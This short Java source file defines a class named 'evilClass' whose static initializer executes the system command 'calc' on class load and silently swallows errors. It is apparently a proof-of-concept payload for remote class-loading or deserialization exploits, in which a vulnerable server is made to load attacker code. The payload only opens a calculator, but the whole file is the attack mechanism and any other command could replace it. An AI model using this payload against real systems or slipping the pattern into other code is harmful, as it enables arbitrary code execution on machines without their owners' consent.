public class evilClass {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){}
    }
}
